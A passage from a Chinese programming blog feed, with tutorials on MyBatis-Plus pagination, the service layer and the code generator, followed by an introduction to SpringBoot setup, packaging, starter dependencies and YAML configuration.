<h5 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h5><h6 id="SQL准备"><a href="#SQL准备" class="headerlink" title="SQL准备"></a>SQL准备</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">	o.*,u.`user_name`</span><br><span class="line">FROM </span><br><span class="line">	USER u,orders o</span><br><span class="line">WHERE </span><br><span class="line">	o.`user_id` = u.`id`</span><br></pre></td></tr></table></figure>

<h6 id="实体类修改"><a href="#实体类修改" class="headerlink" title="实体类修改"></a>实体类修改</h6><p>增加一个userName属性</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Orders</span>  </span>&#123;</span><br><span class="line">	<span class="comment">//省略无关代码</span></span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><p>①定义接口，定义方法</p>
<p>方法第一个测试定义成Page类型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OrdersMapper</span> <span class="keyword">extends</span> <span class="title">BaseMapper</span>&lt;<span class="title">Orders</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">IPage&lt;Orders&gt; <span class="title">findAllOrders</span><span class="params">(Page&lt;Orders&gt; page)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>在xml中不需要关心分页操作，MP会帮我们完成。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.sangeng.mapper.OrdersMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;findAllOrders&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.sangeng.domian.Orders&quot;</span>&gt;</span></span><br><span class="line">        SELECT</span><br><span class="line">            o.*,u.`user_name`</span><br><span class="line">        FROM</span><br><span class="line">            USER u,orders o</span><br><span class="line">        WHERE</span><br><span class="line">            o.`user_id` = u.`id`</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后调用方法测试即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> OrdersMapper ordersMapper;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testOrdersPage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Page&lt;Orders&gt; page = <span class="keyword">new</span> Page&lt;&gt;();</span><br><span class="line">    <span class="comment">//设置每页大小</span></span><br><span class="line">    page.setSize(<span class="number">2</span>);</span><br><span class="line">    <span class="comment">//设置当前页码</span></span><br><span class="line">    page.setCurrent(<span class="number">2</span>);</span><br><span class="line">    ordersMapper.findAllOrders(page);</span><br><span class="line">    System.out.println(page.getRecords());</span><br><span class="line">    System.out.println(page.getTotal());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="8-Service-层接口"><a href="#8-Service-层接口" class="headerlink" title="8.Service 层接口"></a>8.Service 层接口</h2><p>​    MP也为我们提供了<span id="service">Service</span>层的实现。我们只需要编写一个接口，继承<code>IService</code>，并创建一个接口实现类继承<code>ServiceImpl</code>，即可使用。</p>
<p>​    相比于Mapper接口，Service层主要是支持了更多批量操作的方法。</p>
<h3 id="8-1-基本使用"><a href="#8-1-基本使用" class="headerlink" title="8.1 基本使用"></a>8.1 基本使用</h3><h4 id="8-1-1-改造前"><a href="#8-1-1-改造前" class="headerlink" title="8.1.1 改造前"></a>8.1.1 改造前</h4><p>定义接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function">List&lt;User&gt; <span class="title">list</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>定义实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;User&gt; <span class="title">list</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper.selectList(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="8-1-2-改造后"><a href="#8-1-2-改造后" class="headerlink" title="8.1.2 改造后"></a>8.1.2 改造后</h4><p>接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> <span class="keyword">extends</span> <span class="title">IService</span>&lt;<span class="title">User</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">extends</span> <span class="title">ServiceImpl</span>&lt;<span class="title">UserMapper</span>,<span class="title">User</span>&gt; <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSeervice</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List&lt;User&gt; list = userService.list();</span><br><span class="line">    System.out.println(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="8-2自定义方法"><a href="#8-2自定义方法" class="headerlink" title="8.2自定义方法"></a>8.2自定义方法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> <span class="keyword">extends</span> <span class="title">IService</span>&lt;<span class="title">User</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function">User <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">extends</span> <span class="title">ServiceImpl</span>&lt;<span class="title">UserMapper</span>,<span class="title">User</span>&gt; <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> OrdersMapper ordersMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        UserMapper userMapper = getBaseMapper();</span><br><span class="line">        List&lt;Orders&gt; orders = ordersMapper.selectList(<span class="keyword">null</span>);</span><br><span class="line">        User user = userMapper.selectById(<span class="number">3</span>);</span><br><span class="line">        <span class="comment">//查询用户对于的订单</span></span><br><span class="line">        QueryWrapper&lt;Orders&gt; wrapper = <span class="keyword">new</span> QueryWrapper&lt;&gt;();</span><br><span class="line">        wrapper.eq(<span class="string">&quot;user_id&quot;</span>,<span class="number">3</span>);</span><br><span class="line">        List&lt;Orders&gt; ordersList = ordersMapper.selectList(wrapper);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h2 id="9-代码生成器"><a href="#9-代码生成器" class="headerlink" title="9.代码生成器"></a>9.代码生成器</h2><p>​    MP提供了一个代码生成器，可以让我们一键生成实体类，Mapper接口，Service，Controller等全套代码 。使用方式如下</p>
<h3 id="①添加依赖"><a href="#①添加依赖" class="headerlink" title="①添加依赖"></a>①添加依赖</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--mybatisplus代码生成器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-generator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--模板引擎--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.freemarker<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>freemarker<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="②生成"><a href="#②生成" class="headerlink" title="②生成"></a>②生成</h3><p>​    修改相应配置后执行以下代码即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GeneratorTest</span> </span>&#123;</span><br><span class="line">	<span class="meta">@Test</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">generate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		AutoGenerator generator = <span class="keyword">new</span> AutoGenerator();</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 全局配置</span></span><br><span class="line">		GlobalConfig config = <span class="keyword">new</span> GlobalConfig();</span><br><span class="line">		String projectPath = System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line">		<span class="comment">// 设置输出到的目录</span></span><br><span class="line">		config.setOutputDir(projectPath + <span class="string">&quot;/src/main/java&quot;</span>);</span><br><span class="line">		config.setAuthor(<span class="string">&quot;sangeng&quot;</span>);</span><br><span class="line">		<span class="comment">// 生成结束后是否打开文件夹</span></span><br><span class="line">		config.setOpen(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 全局配置添加到 generator 上</span></span><br><span class="line">		generator.setGlobalConfig(config);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 数据源配置</span></span><br><span class="line">		DataSourceConfig dataSourceConfig = <span class="keyword">new</span> DataSourceConfig();</span><br><span class="line">		dataSourceConfig.setUrl(<span class="string">&quot;jdbc:mysql://localhost:3306/mp_db?characterEncoding=utf-8&amp;serverTimezone=UTC&quot;</span>);</span><br><span class="line">		dataSourceConfig.setDriverName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">		dataSourceConfig.setUsername(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">		dataSourceConfig.setPassword(<span class="string">&quot;root&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 数据源配置添加到 generator</span></span><br><span class="line">		generator.setDataSource(dataSourceConfig);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 包配置, 生成的代码放在哪个包下</span></span><br><span class="line">		PackageConfig packageConfig = <span class="keyword">new</span> PackageConfig();</span><br><span class="line">		packageConfig.setParent(<span class="string">&quot;com.sangeng.mp.generator&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 包配置添加到 generator</span></span><br><span class="line">		generator.setPackageInfo(packageConfig);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 策略配置</span></span><br><span class="line">		StrategyConfig strategyConfig = <span class="keyword">new</span> StrategyConfig();</span><br><span class="line">		<span class="comment">// 下划线驼峰命名转换</span></span><br><span class="line">		strategyConfig.setNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">		strategyConfig.setColumnNaming(NamingStrategy.underline_to_camel);</span><br><span class="line">		<span class="comment">// 开启lombok</span></span><br><span class="line">		strategyConfig.setEntityLombokModel(<span class="keyword">true</span>);</span><br><span class="line">		<span class="comment">// 开启RestController</span></span><br><span class="line">		strategyConfig.setRestControllerStyle(<span class="keyword">true</span>);</span><br><span class="line">		generator.setStrategy(strategyConfig);</span><br><span class="line">		generator.setTemplateEngine(<span class="keyword">new</span> FreemarkerTemplateEngine());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 开始生成</span></span><br><span class="line">		generator.execute();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>MybatisPlus</tag>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot初步学习</title>
    <url>/2022/02/01/SpringBoot%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="1-SpringBoot简介"><a href="#1-SpringBoot简介" class="headerlink" title="1. SpringBoot简介"></a>1. SpringBoot简介<span id="more"></span></h2><h3 id="1-1-为什么要学习SpringBoot"><a href="#1-1-为什么要学习SpringBoot" class="headerlink" title="1.1 为什么要学习SpringBoot"></a>1.1 为什么要学习SpringBoot</h3><p>​    SSM还是使用起来不够方便。</p>
<ul>
<li>还需要写很多的配置才能进行正常的使用。</li>
<li>实现一个功能需要引入很多的依赖，尤其是要自己去维护依赖的版本，特别容易出现依赖冲突等问题。</li>
</ul>
<p>​    SpringBoot就能很好的解决上述问题。</p>
<h3 id="1-2-SpringBoot是什么"><a href="#1-2-SpringBoot是什么" class="headerlink" title="1.2 SpringBoot是什么"></a>1.2 SpringBoot是什么</h3><p>​    Spring Boot是基于Spring开发的全新框架，相当于对Spring做了又一层封装。</p>
<p>​    其设计目的是用来简化Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。（自动配置）</p>
<p>​    并且对第三方依赖的添加也进行了封装简化。（起步依赖）</p>
<p>​    所以Spring能做的他都能做，并且简化了配置。</p>
<p>​    并且还提供了一些Spring所没有的比如：</p>
<ul>
<li><p>内嵌web容器，不再需要部署到web容器中</p>
<p>提供准备好的特性，如指标、健康检查和外部化配置 </p>
</li>
</ul>
<p>​    最大特点：<strong>自动配置</strong>、<strong>起步依赖</strong></p>
<p>​    官网：<a href="https://spring.io/projects/spring-boot">https://spring.io/projects/spring-boot</a></p>
<h2 id="2-快速入门"><a href="#2-快速入门" class="headerlink" title="2.快速入门"></a>2.快速入门</h2><h4 id="2-1清理Maven仓库脚本"><a href="#2-1清理Maven仓库脚本" class="headerlink" title="2.1清理Maven仓库脚本"></a>2.1清理Maven仓库脚本</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">rem create by NettQun</span><br><span class="line">  </span><br><span class="line">rem 这里写你的仓库路径</span><br><span class="line">set REPOSITORY_PATH=E:\Develop\maven_rep</span><br><span class="line">rem 正在搜索...</span><br><span class="line">for /f &quot;delims=&quot; %%i in (&#x27;dir /b /s &quot;%REPOSITORY_PATH%\*lastUpdated*&quot;&#x27;) do (</span><br><span class="line">    echo %%i</span><br><span class="line">    del /s /q &quot;%%i&quot;</span><br><span class="line">)</span><br><span class="line">rem 搜索完毕</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>

<p>创建一个bat文件，然后复制上述脚本进去，修改其中maven本地仓库的地址，保存后双击执行即可。</p>
<h4 id="2-2HelloWorld程序"><a href="#2-2HelloWorld程序" class="headerlink" title="2.2HelloWorld程序"></a>2.2HelloWorld程序</h4><h5 id="继承父工程-添加依赖"><a href="#继承父工程-添加依赖" class="headerlink" title="继承父工程,添加依赖"></a>继承父工程,添加依赖</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springBoot<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="创建启动类"><a href="#创建启动类" class="headerlink" title="创建启动类"></a>创建启动类</h5><p>创建一个类并加上@SpringBootApplication注解标识为启动类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.blue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloApplication</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(HelloApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>创建controller包,新建helloController.java,和SpringMVC类似</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.blue.controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;HelloSpringBoot&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动的时候不需要去配置Tomcat,直接启动刚才配置的启动类的main方法即可</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220201190334027.png" alt="image-20220201190334027"></p>
<h3 id="2-3-SpringBoot打包部署"><a href="#2-3-SpringBoot打包部署" class="headerlink" title="2.3 SpringBoot打包部署"></a>2.3 SpringBoot打包部署</h3><p>1.添加maven插件,pom.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.maven打包,运行package</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220201191519221.png" alt="image-20220201191519221"></p>
<p>找到对应target目录下生成的jar包</p>
<p>3.运行jar包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar jar包路径</span><br></pre></td></tr></table></figure>

<h3 id="2-4-快速部署"><a href="#2-4-快速部署" class="headerlink" title="2.4 快速部署"></a>2.4 快速部署</h3><p>​    <a href="https://start.spring.io/">https://start.spring.io/</a></p>
<h2 id="3-起步依赖"><a href="#3-起步依赖" class="headerlink" title="3.起步依赖"></a>3.起步依赖</h2><p>​    SpringBoot依靠父项目中的版本锁定和starter机制让我们能更轻松的实现对依赖的管理。</p>
<h3 id="3-0-依赖冲突及其解决方案"><a href="#3-0-依赖冲突及其解决方案" class="headerlink" title="3.0 依赖冲突及其解决方案"></a>3.0 依赖冲突及其解决方案</h3><h4 id="3-0-1-依赖冲突"><a href="#3-0-1-依赖冲突" class="headerlink" title="3.0.1 依赖冲突"></a>3.0.1 依赖冲突</h4><p>​    一般程序在运行时发生类似于 java.lang.ClassNotFoundException，Method not found: ‘……’，或者莫名其妙的异常信息，这种情况一般很大可能就是 jar包依赖冲突的问题引起的了。</p>
<p>​    一般在是A依赖C(低版本)，B也依赖C(高版本)。 都是他们依赖的又是不同版本的C的时候会出现。</p>
<p>​    </p>
<h4 id="3-0-2-解决方案"><a href="#3-0-2-解决方案" class="headerlink" title="3.0.2 解决方案"></a>3.0.2 解决方案</h4><p>​    如果出现了类似于 java.lang.ClassNotFoundException，Method not found: 这些异常检查相关的依赖冲突问题，排除掉低版本的依赖，留下高版本的依赖。</p>
<p>​    </p>
<p>​    </p>
<h3 id="3-1-版本锁定"><a href="#3-1-版本锁定" class="headerlink" title="3.1 版本锁定"></a>3.1 版本锁定</h3><p>​    我们的SpringBoot模块都需要继承一个父工程：<strong>spring-boot-starter-parent</strong>。在spring-boot-starter-parent的父工程<strong>spring-boot-dependencies</strong>中对常用的依赖进行了版本锁定。这样我们在添加依赖时，很多时候都不需要添加依赖的版本号了。</p>
<p>​    </p>
<p>​    我们也可以采用覆盖properties配置或者直接指定版本号的方式修改依赖的版本。</p>
<p>例如：</p>
<p>直接指定版本号</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>覆盖properties配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aspectj.version</span>&gt;</span>1.7.2<span class="tag">&lt;/<span class="name">aspectj.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="3-2-starter机制"><a href="#3-2-starter机制" class="headerlink" title="3.2 starter机制"></a>3.2 starter机制</h3><p>​    当我们需要使用某种功能时只需要引入对应的starter即可。一个starter针对一种特定的场景，其内部引入了该场景所需的依赖。这样我们就不需要单独引入多个依赖了。</p>
<p>​    命名规律</p>
<ul>
<li>官方starter都是以  <code>spring-boot-starter</code>开头后面跟上场景名称。例如：spring-boot-starter-data-jpa</li>
<li>非官方starter则是以 <code>场景名-spring-boot-starter</code>的格式，例如：mybatis-spring-boot-starter</li>
</ul>
<h2 id="4-自动配置"><a href="#4-自动配置" class="headerlink" title="4.自动配置"></a>4.自动配置</h2><p>​    SpringBoot中最重要的特性就是自动配置。</p>
<p>​    Springboot遵循“<strong>约定优于配置</strong>”的原则，自动进行了默认配置。这样我们就不需要做大量的配置。</p>
<p>​    当我们需要使用什么场景时，就会自动配置这个场景相关的配置。</p>
<p>​    如果他的默认配置不符合我们的需求时修改这部分配置即可。</p>
<h2 id="5-YML配置"><a href="#5-YML配置" class="headerlink" title="5.YML配置"></a>5.YML配置</h2><h3 id="5-1-简介"><a href="#5-1-简介" class="headerlink" title="5.1.简介"></a>5.1.简介</h3><h4 id="5-1-1YML是什么"><a href="#5-1-1YML是什么" class="headerlink" title="5.1.1YML是什么"></a>5.1.1YML是什么</h4><p>​        YAML (YAML Ain’t a Markup Language)YAML不是一种标记语言，通常以.yml为后缀的文件，是一种直观的能够被电脑识别的数据序列化格式，并且容易被人类阅读，容易和脚本语言交互的，可以被支持YAML库的不同的编程语言程序导入，一种专门用来写配置文件的语言。</p>
<p>​         YAML试图用一种比XML更敏捷的方式，来完成XML所完成的任务。</p>
<p>​         例如： </p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">student:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">sangeng</span></span><br><span class="line">    <span class="attr">age:</span> <span class="number">15</span></span><br></pre></td></tr></table></figure>



